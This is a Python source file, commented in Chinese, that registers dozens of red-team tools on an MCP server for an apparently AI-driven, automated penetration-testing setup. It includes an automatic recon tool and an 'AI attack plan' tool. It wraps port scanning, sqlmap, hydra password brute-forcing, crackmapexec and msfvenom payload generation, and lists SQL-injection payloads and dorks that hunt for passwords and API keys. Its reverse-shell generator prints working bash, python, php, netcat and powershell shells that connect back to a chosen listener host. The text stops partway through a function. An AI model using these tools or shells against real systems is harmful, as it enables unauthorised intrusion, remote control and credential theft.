#!/usr/bin/env python3
"""
MCP工具定义 - 所有红队工具的注册和实现
增强版: 支持终端实时进度显示
"""

import subprocess
import json
import base64
import urllib.parse
import sys
import time
import threading
import os
import shutil
from typing import Dict, List, Optional
from datetime import datetime

# 全局配置
ENABLE_TERMINAL_DISPLAY = True  # 是否启用终端进度显示
DEFAULT_TIMEOUT = 300  # 默认超时时间(秒)
VERBOSE_MODE = True  # 详细模式
REALTIME_OUTPUT = True  # 实时输出到终端

# 导入终端输出模块和扫描监控
try:
    from utils.terminal_output import terminal, run_with_realtime_output
    from utils.scan_monitor import run_monitored_scan, scan_monitor, list_running_scans
    HAS_TERMINAL = True
    HAS_MONITOR = True
except ImportError:
    HAS_TERMINAL = False
    HAS_MONITOR = False
    # 回退到基本输出
    class FallbackTerminal:
        def tool_start(self, *args): pass
        def tool_complete(self, *args): pass
        def tool_output(self, *args): pass
        def tool_progress(self, *args): pass
        def header(self, *args): pass
        def info(self, msg): print(f"[INFO] {msg}", file=sys.stderr)
        def warning(self, msg): print(f"[WARN] {msg}", file=sys.stderr)
        def error(self, msg): print(f"[ERROR] {msg}", file=sys.stderr)
        def success(self, msg): print(f"[OK] {msg}", file=sys.stderr)
        def finding(self, title, details=None): print(f"[FOUND] {title}: {details}", file=sys.stderr)
    terminal = FallbackTerminal()
    
    def run_monitored_scan(cmd, tool_name, target, timeout=300, show_output=True):
        """回退的监控扫描"""
        return run_with_realtime_output(cmd, tool_name, target, timeout, show_output) if HAS_TERMINAL else {}

# ========== 工具可用性检查 ==========

class ToolChecker:
    """工具可用性检查器"""
    
    TOOLS = {
        "nmap": "端口扫描",
        "subfinder": "子域名枚举",
        "httpx": "HTTP探测",
        "whatweb": "技术栈识别",
        "wafw00f": "WAF检测",
        "nuclei": "漏洞扫描",
        "gobuster": "目录扫描",
        "nikto": "Web漏洞扫描",
        "sslscan": "SSL扫描",
        "sqlmap": "SQL注入",
        "hydra": "密码爆破",
        "whois": "域名查询",
        "dig": "DNS查询"
    }
    
    @classmethod
    def check(cls, tool: str) -> bool:
        return shutil.which(tool) is not None
    
    @classmethod
    def check_all(cls) -> Dict[str, bool]:
        return {t: cls.check(t) for t in cls.TOOLS}
    
    @classmethod
    def print_status(cls):
        print("\n" + "="*50)
        print("  🔧 工具可用性检查")
        print("="*50)
        for tool, desc in cls.TOOLS.items():
            status = "✓" if cls.check(tool) else "✗"
            color = "\033[92m" if cls.check(tool) else "\033[91m"
            print(f"  {color}{status}\033[0m {tool} - {desc}")
        print("="*50 + "\n")



# ========== 工具执行引擎 (重构版) ==========

def run_cmd(cmd: List[str], timeout: int = 300, tool_name: str = None, target: str = None, show_output: bool = True) -> Dict:
    """
    统一命令执行入口
    支持实时终端输出、超时控制、监控和结果捕获
    """
    # 优先使用监控模式 (如果环境支持)
    if REALTIME_OUTPUT and HAS_MONITOR and tool_name and target:
        return run_monitored_scan(cmd, tool_name, target, timeout, show_output)
    
    # 次选：实时输出模式
    if REALTIME_OUTPUT and HAS_TERMINAL and tool_name and target:
        return run_with_realtime_output(cmd, tool_name, target, timeout, show_output)
    
    # 回退模式：简单的subprocess调用
    if tool_name and target:
        terminal.info(f"[{tool_name}] 开始扫描 {target}")
        terminal.info(f"命令: {' '.join(cmd)}")
    
    start_time = time.time()
    try:
        # 强制非缓冲
        env = os.environ.copy()
        env['PYTHONUNBUFFERED'] = '1'
        
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, env=env)
        duration = time.time() - start_time
        
        if tool_name:
            terminal.info(f"[{tool_name}] 完成 ({duration:.1f}s)")
            
        return {
            "success": True, 
            "stdout": r.stdout, 
            "stderr": r.stderr, 
            "command": " ".join(cmd), 
            "duration": duration,
            "returncode": r.returncode
        }
    except subprocess.TimeoutExpired:
        if tool_name:
            terminal.error(f"[{tool_name}] 超时")
        return {"success": False, "error": "超时", "command": " ".join(cmd)}
    except FileNotFoundError:
        if tool_name:
            terminal.error(f"[{tool_name}] 工具未找到: {cmd[0]}")
        return {"success": False, "error": f"未找到: {cmd[0]}", "command": " ".join(cmd)}
    except Exception as e:
        if tool_name:
            terminal.error(f"[{tool_name}] 错误: {e}")
        return {"success": False, "error": str(e), "command": " ".join(cmd)}


# 兼容性包装 (逐步废弃)
def run_cmd_with_progress(cmd: List[str], tool_name: str, target: str, timeout: int = 300, use_sudo: bool = False) -> Dict:
    """兼容旧接口，重定向到 run_cmd"""
    if use_sudo:
        cmd = ["sudo"] + cmd
    # 直接调用统一入口，不再使用虚假的进度条
    return run_cmd(cmd, timeout, tool_name, target)


def register_all_tools(server):
    """注册所有56个红队工具"""
    
    # ========== 信息收集 (20个) ==========
    
    # 1. Nmap扫描
    server.register_tool("nmap_scan", "Nmap端口扫描 - 扫描目标开放端口和服务", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标IP/域名/CIDR"},
            "ports": {"type": "string", "description": "端口范围", "default": "1-1000"},
            "scan_type": {"type": "string", "enum": ["quick", "full", "stealth", "version"], "default": "quick"}
        },
        "required": ["target"]
    }, lambda a: _nmap_scan(a))
    
    # 2. 子域名枚举
    server.register_tool("subdomain_enum", "子域名枚举 - 枚举目标域名的子域名", {
        "type": "object",
        "properties": {
            "domain": {"type": "string", "description": "目标域名"},
            "tools": {"type": "array", "items": {"type": "string"}, "description": "使用的工具"}
        },
        "required": ["domain"]
    }, lambda a: _subdomain_enum(a))
    
    # 3. DNS枚举
    server.register_tool("dns_enum", "DNS枚举 - 查询DNS记录", {
        "type": "object",
        "properties": {
            "domain": {"type": "string", "description": "目标域名"},
            "record_types": {"type": "string", "description": "记录类型", "default": "A,AAAA,MX,NS,TXT"}
        },
        "required": ["domain"]
    }, lambda a: _dns_enum(a))
    
    # 4. Zone Transfer测试
    server.register_tool("zone_transfer", "DNS区域传送测试 - 检测AXFR漏洞", {
        "type": "object",
        "properties": {
            "domain": {"type": "string", "description": "目标域名"},
            "nameserver": {"type": "string", "description": "NS服务器"}
        },
        "required": ["domain"]
    }, lambda a: _zone_transfer(a))
    
    # 5. Whois查询
    server.register_tool("whois_lookup", "Whois查询 - 获取域名/IP注册信息", {
        "type": "object",
        "properties": {"target": {"type": "string", "description": "目标域名或IP"}},
        "required": ["target"]
    }, lambda a: run_cmd(["whois", a["target"]], 30))
    
    # 6. TheHarvester
    server.register_tool("theharvester", "TheHarvester - 收集邮箱、子域名等信息", {
        "type": "object",
        "properties": {
            "domain": {"type": "string", "description": "目标域名"},
            "sources": {"type": "string", "description": "数据源", "default": "google,bing"},
            "limit": {"type": "integer", "description": "结果限制", "default": 100}
        },
        "required": ["domain"]
    }, lambda a: run_cmd(["theHarvester", "-d", a["domain"], "-b", a.get("sources", "google,bing"), "-l", str(a.get("limit", 100))], 300))
    
    # 7. WhatWeb
    server.register_tool("whatweb", "WhatWeb - 识别Web技术栈", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标URL"},
            "aggression": {"type": "integer", "description": "扫描强度(1-4)", "default": 1}
        },
        "required": ["target"]
    }, lambda a: run_cmd(["whatweb", "-a", str(a.get("aggression", 1)), a["target"]], 120))
    
    # 8. WAF检测
    server.register_tool("wafw00f", "WAF检测 - 识别Web应用防火墙", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标URL"},
            "find_all": {"type": "boolean", "description": "查找所有WAF", "default": False}
        },
        "required": ["target"]
    }, lambda a: _wafw00f(a))
    
    # 9. Httpx探测
    server.register_tool("httpx_probe", "Httpx - HTTP探测和信息收集", {
        "type": "object",
        "properties": {
            "targets": {"type": "string", "description": "目标URL列表(逗号分隔)"},
            "ports": {"type": "string", "description": "端口", "default": "80,443,8080"}
        },
        "required": ["targets"]
    }, lambda a: _httpx_probe(a))
    
    # 10. Google Dork生成
    server.register_tool("google_dork", "Google Dork - 生成高级搜索语法", {
        "type": "object",
        "properties": {
            "domain": {"type": "string", "description": "目标域名"},
            "dork_type": {"type": "string", "enum": ["all", "files", "login", "sensitive"], "default": "all"}
        },
        "required": ["domain"]
    }, lambda a: _google_dork(a))
    
    # ========== 漏洞扫描 (8个) ==========
    
    # 11. Nuclei漏洞扫描
    server.register_tool("vuln_scan", "Nuclei漏洞扫描 - 快速漏洞检测", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标URL"},
            "severity": {"type": "string", "enum": ["info", "low", "medium", "high", "critical"], "description": "严重性过滤"},
            "tags": {"type": "array", "items": {"type": "string"}, "description": "漏洞标签"}
        },
        "required": ["target"]
    }, lambda a: _nuclei_scan(a))
    
    # 12. Nikto扫描
    server.register_tool("nikto_scan", "Nikto - Web服务器漏洞扫描", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标URL"},
            "port": {"type": "integer", "description": "端口", "default": 80},
            "ssl": {"type": "boolean", "description": "使用SSL", "default": False}
        },
        "required": ["target"]
    }, lambda a: _nikto_scan(a))
    
    # 13. SSL扫描
    server.register_tool("sslscan", "SSLScan - SSL/TLS配置扫描", {
        "type": "object",
        "properties": {"target": {"type": "string", "description": "目标主机:端口"}},
        "required": ["target"]
    }, lambda a: run_cmd(["sslscan", a["target"]], 60))
    
    # 14. TestSSL
    server.register_tool("testssl", "TestSSL - 全面SSL/TLS测试", {
        "type": "object",
        "properties": {"target": {"type": "string", "description": "目标主机:端口"}},
        "required": ["target"]
    }, lambda a: run_cmd(["testssl", a["target"]], 300))
    
    # 15. Searchsploit
    server.register_tool("searchsploit", "Searchsploit - 搜索Exploit-DB漏洞", {
        "type": "object",
        "properties": {
            "query": {"type": "string", "description": "搜索关键词"},
            "exact": {"type": "boolean", "description": "精确匹配", "default": False}
        },
        "required": ["query"]
    }, lambda a: _searchsploit(a))
    
    # 16. CVE搜索
    server.register_tool("cve_search", "CVE搜索 - 搜索CVE漏洞信息", {
        "type": "object",
        "properties": {
            "query": {"type": "string", "description": "搜索关键词或CVE ID"},
            "product": {"type": "string", "description": "产品名称"}
        },
        "required": ["query"]
    }, lambda a: _cve_search(a))
    
    # ========== Web攻击 (9个) ==========
    
    # 17. SQL注入测试
    server.register_tool("sqli_test", "SQL注入测试 - SQLMap自动化检测", {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "目标URL(带参数)"},
            "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"},
            "data": {"type": "string", "description": "POST数据"},
            "level": {"type": "integer", "description": "测试等级(1-5)", "default": 1},
            "risk": {"type": "integer", "description": "风险等级(1-3)", "default": 1}
        },
        "required": ["url"]
    }, lambda a: _sqlmap(a))
    
    # 18. SQL注入Payload生成
    server.register_tool("sqli_payload", "SQL注入Payload生成器", {
        "type": "object",
        "properties": {
            "type": {"type": "string", "enum": ["union", "boolean", "time", "error"], "description": "Payload类型"},
            "dbms": {"type": "string", "enum": ["mysql", "postgresql", "mssql", "oracle"], "default": "mysql"},
            "columns": {"type": "integer", "description": "UNION列数", "default": 5}
        },
        "required": ["type"]
    }, lambda a: _sqli_payload(a))
    
    # 19. XSS检测
    server.register_tool("xss_scan", "XSS扫描 - XSS漏洞检测", {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "目标URL"},
            "data": {"type": "string", "description": "POST数据"},
            "crawl": {"type": "boolean", "description": "爬取链接", "default": False}
        },
        "required": ["url"]
    }, lambda a: run_cmd(["xsstrike", "-u", a["url"]] + (["-c"] if a.get("crawl") else []), 300))
    
    # 20. 目录扫描
    server.register_tool("dir_scan", "目录扫描 - Web目录和文件发现", {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "目标URL"},
            "wordlist": {"type": "string", "description": "字典文件", "default": "/usr/share/wordlists/dirb/common.txt"},
            "extensions": {"type": "string", "description": "文件扩展名"}
        },
        "required": ["url"]
    }, lambda a: _dir_scan(a))
    
    # 21. Gobuster扫描
    server.register_tool("gobuster", "Gobuster - 快速目录/DNS暴力扫描", {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "目标URL"},
            "wordlist": {"type": "string", "description": "字典文件"},
            "mode": {"type": "string", "enum": ["dir", "dns", "vhost"], "default": "dir"},
            "extensions": {"type": "string", "description": "扩展名"},
            "threads": {"type": "integer", "description": "线程数", "default": 10}
        },
        "required": ["url"]
    }, lambda a: _gobuster(a))
    
    # 22. Ffuf扫描
    server.register_tool("ffuf", "Ffuf - 快速Web Fuzzer", {
        "type": "object",
        "properties": {
            "url": {"type": "string", "description": "目标URL(FUZZ标记注入点)"},
            "wordlist": {"type": "string", "description": "字典文件"},
            "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"},
            "mc": {"type": "string", "description": "匹配状态码", "default": "200,204,301,302,307,401,403"}
        },
        "required": ["url", "wordlist"]
    }, lambda a: _ffuf(a))
    
    # ========== 网络攻击 (8个) ==========
    
    # 23. 密码爆破
    server.register_tool("brute_force", "密码爆破 - 网络服务密码破解", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标地址"},
            "service": {"type": "string", "enum": ["ssh", "ftp", "mysql", "rdp", "smb"], "description": "服务类型"},
            "username": {"type": "string", "description": "用户名或用户名文件"},
            "password_list": {"type": "string", "description": "密码字典", "default": "/usr/share/wordlists/rockyou.txt"}
        },
        "required": ["target", "service"]
    }, lambda a: _hydra(a))
    
    # 24. CrackMapExec
    server.register_tool("crackmapexec", "CrackMapExec - 网络渗透和后渗透", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标IP/范围"},
            "protocol": {"type": "string", "enum": ["smb", "ssh", "winrm", "ldap", "mssql"], "description": "协议"},
            "username": {"type": "string", "description": "用户名"},
            "password": {"type": "string", "description": "密码"},
            "action": {"type": "string", "enum": ["", "shares", "sessions", "users", "groups"], "description": "动作"}
        },
        "required": ["target", "protocol"]
    }, lambda a: _crackmapexec(a))
    
    # 25. SMB枚举
    server.register_tool("smb_enum", "SMB枚举 - 枚举SMB共享和用户", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标IP"},
            "username": {"type": "string", "description": "用户名"},
            "password": {"type": "string", "description": "密码"}
        },
        "required": ["target"]
    }, lambda a: run_cmd(["enum4linux", "-a", a["target"]], 300))
    
    # 26. SSH审计
    server.register_tool("ssh_audit", "SSH审计 - SSH服务器安全审计", {
        "type": "object",
        "properties": {"target": {"type": "string", "description": "目标IP:端口"}},
        "required": ["target"]
    }, lambda a: run_cmd(["ssh-audit", a["target"]], 60))
    
    # 27. SNMP Walk
    server.register_tool("snmp_walk", "SNMP Walk - SNMP信息收集", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标IP"},
            "community": {"type": "string", "description": "Community字符串", "default": "public"},
            "version": {"type": "string", "enum": ["1", "2c"], "default": "2c"}
        },
        "required": ["target"]
    }, lambda a: run_cmd(["snmpwalk", "-v", a.get("version", "2c"), "-c", a.get("community", "public"), a["target"]], 120))
    
    # 28. LDAP枚举
    server.register_tool("ldap_enum", "LDAP枚举 - LDAP信息收集", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标IP"},
            "base_dn": {"type": "string", "description": "Base DN"}
        },
        "required": ["target"]
    }, lambda a: run_cmd(["ldapsearch", "-x", "-H", f"ldap://{a['target']}", "-b", a.get("base_dn", "")], 60))
    
    # ========== 漏洞利用 (3个) ==========
    
    # 29. Metasploit搜索
    server.register_tool("msf_search", "Metasploit搜索 - 搜索漏洞利用模块", {
        "type": "object",
        "properties": {"query": {"type": "string", "description": "搜索关键词"}},
        "required": ["query"]
    }, lambda a: run_cmd(["msfconsole", "-q", "-x", f"search {a['query']}; exit"], 60))
    
    # 30. MsfVenom
    server.register_tool("msfvenom", "MsfVenom - 生成Payload", {
        "type": "object",
        "properties": {
            "payload": {"type": "string", "description": "Payload类型"},
            "lhost": {"type": "string", "description": "监听地址"},
            "lport": {"type": "integer", "description": "监听端口"},
            "format": {"type": "string", "description": "输出格式", "default": "raw"}
        },
        "required": ["payload", "lhost", "lport"]
    }, lambda a: run_cmd(["msfvenom", "-p", a["payload"], f"LHOST={a['lhost']}", f"LPORT={a['lport']}", "-f", a.get("format", "raw")], 60))
    
    # 31. 反向Shell生成
    server.register_tool("reverse_shell", "反向Shell生成器 - 生成各类反向Shell", {
        "type": "object",
        "properties": {
            "lhost": {"type": "string", "description": "监听地址"},
            "lport": {"type": "integer", "description": "监听端口"},
            "type": {"type": "string", "enum": ["bash", "python", "php", "nc", "powershell"], "description": "Shell类型"}
        },
        "required": ["lhost", "lport", "type"]
    }, lambda a: _reverse_shell(a))
    
    # ========== 后渗透 (5个) ==========
    
    # 32. LinPEAS信息
    server.register_tool("linpeas", "LinPEAS - Linux权限提升枚举脚本", {
        "type": "object",
        "properties": {"action": {"type": "string", "enum": ["info", "download"], "default": "info"}}
    }, lambda a: _privesc_script("linpeas", a))
    
    # 33. WinPEAS信息
    server.register_tool("winpeas", "WinPEAS - Windows权限提升枚举脚本", {
        "type": "object",
        "properties": {"action": {"type": "string", "enum": ["info", "download"], "default": "info"}}
    }, lambda a: _privesc_script("winpeas", a))
    
    # 34. Linux Exploit Suggester
    server.register_tool("linux_exploit_suggester", "Linux Exploit Suggester - 内核漏洞建议", {
        "type": "object",
        "properties": {"kernel_version": {"type": "string", "description": "内核版本"}}
    }, lambda a: _linux_exploit_suggester(a))
    
    # 35. LinEnum
    server.register_tool("linenum", "LinEnum - Linux枚举脚本", {
        "type": "object",
        "properties": {"action": {"type": "string", "enum": ["info", "download"], "default": "info"}}
    }, lambda a: _privesc_script("linenum", a))
    
    # 36. Windows枚举
    server.register_tool("windows_enum", "Windows枚举 - Windows系统信息收集", {
        "type": "object",
        "properties": {"action": {"type": "string", "enum": ["info", "download"], "default": "info"}}
    }, lambda a: _privesc_script("windows_enum", a))
    
    # ========== 云安全 (4个) ==========
    
    # 37. AWS枚举
    server.register_tool("aws_enum", "AWS枚举 - 枚举AWS资源", {
        "type": "object",
        "properties": {
            "profile": {"type": "string", "description": "AWS配置文件"},
            "service": {"type": "string", "enum": ["s3", "ec2", "iam", "all"], "default": "all"}
        }
    }, lambda a: _aws_enum(a))
    
    # 38. S3扫描
    server.register_tool("s3_scanner", "S3扫描 - 扫描S3存储桶", {
        "type": "object",
        "properties": {
            "bucket": {"type": "string", "description": "S3存储桶名称"},
            "check_permissions": {"type": "boolean", "default": True}
        },
        "required": ["bucket"]
    }, lambda a: _s3_scanner(a))
    
    # 39. Azure枚举
    server.register_tool("azure_enum", "Azure枚举 - 枚举Azure资源", {
        "type": "object",
        "properties": {"tenant_id": {"type": "string", "description": "租户ID"}}
    }, lambda a: {"success": True, "message": "Azure枚举需要配置凭证", "command": "az login"})
    
    # 40. Kubernetes Hunter
    server.register_tool("kube_hunter", "Kube-hunter - Kubernetes安全扫描", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标集群地址"},
            "remote": {"type": "boolean", "default": True}
        }
    }, lambda a: run_cmd(["kube-hunter", "--remote", a.get("target", "")] if a.get("target") else ["kube-hunter"], 300))
    
    # ========== AI辅助 (3个) ==========
    
    # 41. 智能自动打点
    server.register_tool("auto_recon", "🔥 智能自动打点 - AI驱动的全自动渗透测试", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标IP或域名"},
            "fast_mode": {"type": "boolean", "description": "快速模式", "default": False},
            "deep_scan": {"type": "boolean", "description": "深度扫描", "default": True},
            "web_scan": {"type": "boolean", "description": "Web扫描", "default": True}
        },
        "required": ["target"]
    }, lambda a: _auto_recon(a))
    
    # 42. 智能服务分析
    server.register_tool("smart_service_scan", "智能服务分析 - 根据端口自动选择扫描策略", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标IP"},
            "ports": {"type": "string", "description": "端口列表(逗号分隔)"}
        },
        "required": ["target", "ports"]
    }, lambda a: _smart_service_scan(a))
    
    # 43. AI攻击规划
    server.register_tool("ai_attack_plan", "AI攻击规划 - AI生成攻击计划", {
        "type": "object",
        "properties": {
            "target": {"type": "string", "description": "目标信息"},
            "recon_data": {"type": "object", "description": "侦察数据"},
            "objectives": {"type": "array", "items": {"type": "string"}, "description": "攻击目标"}
        },
        "required": ["target"]
    }, lambda a: _ai_attack_plan(a))
    
    # 注册增强工具 (44-48)
    register_enhanced_tools(server)


# ========== 工具实现函数 ==========

def _nmap_scan(args: Dict) -> Dict:
    target = args["target"]
    ports = args.get("ports", "")
    scan_type = args.get("scan_type", "quick")
    
    # 构建nmap命令 - 增加 -v 参数以支持实时进度输出
    if scan_type == "quick":
        cmd = ["nmap", "-v", "-T4", "-F", target]  # 快速扫描常用100端口
    elif scan_type == "full":
        cmd = ["nmap", "-v", "-T4", "-A", "-p-", target]  # 全端口扫描
    elif scan_type == "stealth":
        cmd = ["nmap", "-v", "-sS", "-T2", target]  # 隐蔽扫描
    elif scan_type == "version":
        cmd = ["nmap", "-v", "-sV", "-sC", target]  # 版本检测
    else:
        cmd = ["nmap", "-v", "-T4", target]
    
    # 如果指定了端口范围，替换-F参数
    if ports and scan_type == "quick":
        cmd = ["nmap", "-v", "-T4", "-p", ports, target]
    elif ports:
        # 插入端口参数
        cmd.insert(-1, "-p")
        cmd.insert(-1, ports)
    
    # 使用sudo运行nmap以获取更好的扫描结果
    return run_cmd_with_progress(cmd, "nmap_scan", target, 120, use_sudo=True)

def _subdomain_enum(args: Dict) -> Dict:
    domain = args["domain"]
    terminal.info(f"开始子域名枚举: {domain}")
    result = run_cmd(["subfinder", "-d", domain, "-silent"], 120, tool_name="subfinder", target=domain)
    if result["success"]:
        subs = [s.strip() for s in result["stdout"].split('\n') if s.strip()]
        result["subdomains"] = subs
        result["count"] = len(subs)
        terminal.finding(f"发现 {len(subs)} 个子域名")
    return result

def _dns_enum(args: Dict) -> Dict:
    domain = args["domain"]
    record_types = args.get("record_types", "A,AAAA,MX,NS,TXT").split(",")
    terminal.info(f"DNS枚举: {domain} - 类型: {','.join(record_types)}")
    results = {"success": True, "domain": domain, "records": {}}
    for rtype in record_types:
        dig = run_cmd(["dig", "+short", domain, rtype.strip()], 30, tool_name="dig", target=domain, show_output=False)
        if dig["success"]:
            records = [r.strip() for r in dig["stdout"].split('\n') if r.strip()]
            results["records"][rtype.strip()] = records
            if records:
                terminal.finding(f"{rtype}: {len(records)} 条记录")
    return results

def _zone_transfer(args: Dict) -> Dict:
    domain = args["domain"]
    ns = args.get("nameserver")
    if ns:
        return run_cmd(["dig", f"@{ns}", domain, "AXFR"], 60)
    return run_cmd(["dig", domain, "NS", "+short"], 30)

def _wafw00f(args: Dict) -> Dict:
    target = args["target"]
    terminal.info(f"WAF检测: {target}")
    cmd = ["wafw00f", target]
    if args.get("find_all"):
        cmd.append("-a")
    return run_cmd(cmd, 60, tool_name="wafw00f", target=target)

def _httpx_probe(args: Dict) -> Dict:
    targets = args["targets"].split(",")
    target_input = "\n".join([t.strip() for t in targets])
    try:
        r = subprocess.run(["httpx", "-silent", "-json", "-title", "-status-code"], 
                          input=target_input, capture_output=True, text=True, timeout=120)
        results = []
        for line in r.stdout.strip().split('\n'):
            if line:
                try:
                    results.append(json.loads(line))
                except:
                    pass
        return {"success": True, "results": results, "count": len(results)}
    except Exception as e:
        return {"success": False, "error": str(e)}

def _google_dork(args: Dict) -> Dict:
    domain = args["domain"]
    dork_type = args.get("dork_type", "all")
    
    dorks = {
        "files": [f'site:{domain} filetype:pdf', f'site:{domain} filetype:doc', f'site:{domain} filetype:sql'],
        "login": [f'site:{domain} inurl:login', f'site:{domain} inurl:admin', f'site:{domain} intitle:"login"'],
        "sensitive": [f'site:{domain} "password"', f'site:{domain} "api_key"', f'site:{domain} intext:"index of /"']
    }
    
    if dork_type == "all":
        all_dorks = []
        for d in dorks.values():
            all_dorks.extend(d)
        return {"success": True, "domain": domain, "dorks": all_dorks}
    return {"success": True, "domain": domain, "dorks": dorks.get(dork_type, [])}

def _nuclei_scan(args: Dict) -> Dict:
    target = args["target"]
    terminal.info(f"Nuclei漏洞扫描: {target}")
    cmd = ["nuclei", "-u", target, "-json", "-silent"]
    if args.get("severity"):
        cmd.extend(["-severity", args["severity"]])
        terminal.info(f"严重性过滤: {args['severity']}")
    if args.get("tags"):
        cmd.extend(["-tags", ",".join(args["tags"])])
        terminal.info(f"标签过滤: {','.join(args['tags'])}")
    
    result = run_cmd(cmd, 600, tool_name="nuclei", target=target)
    if result["success"]:
        vulns = []
        for line in result["stdout"].split('\n'):
            if line.strip():
                try:
                    v = json.loads(line)
                    vulns.append(v)
                    terminal.finding(f"[{v.get('info', {}).get('severity', 'unknown')}] {v.get('info', {}).get('name', 'N/A')}", v.get('matched-at', ''))
                except:
                    pass
        result["vulnerabilities"] = vulns
        result["count"] = len(vulns)
        if vulns:
            terminal.warning(f"发现 {len(vulns)} 个潜在漏洞 - 需要验证!")
    return result

def _nikto_scan(args: Dict) -> Dict:
    target = args["target"]
    terminal.info(f"Nikto扫描: {target}")
    cmd = ["nikto", "-h", target, "-port", str(args.get("port", 80))]
    if args.get("ssl"):
        cmd.append("-ssl")
    return run_cmd(cmd, 600, tool_name="nikto", target=target)

def _searchsploit(args: Dict) -> Dict:
    query = args["query"]
    cmd = ["searchsploit", query, "--json"]
    if args.get("exact"):
        cmd.insert(2, "-e")
    return run_cmd(cmd, 30)

def _cve_search(args: Dict) -> Dict:
    query = args["query"]
    return {"success": True, "query": query, "note": "请访问 https://cve.mitre.org 或 https://nvd.nist.gov 搜索CVE"}

def _sqlmap(args: Dict) -> Dict:
    url = args["url"]
    cmd = ["sqlmap", "-u", url, "--batch", "--level", str(args.get("level", 1)), "--risk", str(args.get("risk", 1))]
    if args.get("data"):
        cmd.extend(["--data", args["data"]])
    return run_cmd(cmd, 600)

def _sqli_payload(args: Dict) -> Dict:
    ptype = args["type"]
    dbms = args.get("dbms", "mysql")
    columns = args.get("columns", 5)
    
    payloads = {
        "union": [f"' UNION SELECT {','.join(['NULL']*columns)}--", f"1' ORDER BY {columns}--"],
        "boolean": ["' AND '1'='1", "' AND '1'='2", "' OR '1'='1"],
        "time": ["' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--"] if dbms == "mysql" else ["'; SELECT pg_sleep(5)--"],
        "error": ["' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"]
    }
    return {"success": True, "type": ptype, "dbms": dbms, "payloads": payloads.get(ptype, [])}

def _dir_scan(args: Dict) -> Dict:
    url = args["url"]
    wordlist = args.get("wordlist", "/usr/share/wordlists/dirb/common.txt")
    terminal.info(f"目录扫描: {url}")
    cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-q"]
    if args.get("extensions"):
        cmd.extend(["-x", args["extensions"]])
    return run_cmd(cmd, 600, tool_name="gobuster", target=url)

def _gobuster(args: Dict) -> Dict:
    url = args["url"]
    wordlist = args.get("wordlist", "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt")
    mode = args.get("mode", "dir")
    cmd = ["gobuster", mode, "-u", url, "-w", wordlist, "-t", str(args.get("threads", 10)), "-q"]
    if args.get("extensions"):
        cmd.extend(["-x", args["extensions"]])
    return run_cmd(cmd, 1800)

def _ffuf(args: Dict) -> Dict:
    url = args["url"]
    wordlist = args["wordlist"]
    cmd = ["ffuf", "-u", url, "-w", wordlist, "-mc", args.get("mc", "200,204,301,302,307,401,403"), "-s"]
    return run_cmd(cmd, 600)

def _hydra(args: Dict) -> Dict:
    target = args["target"]
    service = args["service"]
    username = args.get("username", "admin")
    password_list = args.get("password_list", "/usr/share/wordlists/rockyou.txt")
    
    cmd = ["hydra", "-l", username, "-P", password_list, "-t", "4", "-f", target, service]
    return run_cmd(cmd, 3600)

def _crackmapexec(args: Dict) -> Dict:
    target = args["target"]
    protocol = args["protocol"]
    cmd = ["crackmapexec", protocol, target]
    if args.get("username"):
        cmd.extend(["-u", args["username"]])
    if args.get("password"):
        cmd.extend(["-p", args["password"]])
    if args.get("action"):
        cmd.append(f"--{args['action']}")
    return run_cmd(cmd, 300)

def _reverse_shell(args: Dict) -> Dict:
    lhost = args["lhost"]
    lport = args["lport"]
    shell_type = args["type"]
    
    shells = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python": f'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
        "php": f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
        "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "powershell": f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()}}'
    }
    
    return {
        "success": True, 
        "shell_type": shell_type, 
        "reverse_shell": shells.get(shell_type, shells["bash"]),
        "listener": f"nc -lvnp {lport}",
        "lhost": lhost, 
        "lport": lport
    }

def _privesc_script(script_name: str, args: Dict) -> Dict:
    urls = {
        "linpeas": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
        "winpeas": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe",
        "linenum": "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
        "windows_enum": "https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1"
    }
    
    if args.get("action") == "download":
